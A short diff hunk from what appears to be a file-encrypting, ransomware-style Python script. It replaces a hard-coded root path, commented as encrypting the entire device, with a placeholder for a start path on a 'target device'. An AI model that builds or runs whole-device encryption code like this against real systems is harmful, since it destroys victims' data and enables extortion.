@@ -43,7 +43,7 @@ if __name__ == "__main__":
     proc_config.start()
 
     try:
-        abs_paths = "/"  # encrypt entire device, starting from root directory
+        abs_paths = "<start-path-on-target-device>"
 
         while True:
             # input("\nEnter: start encrypting")
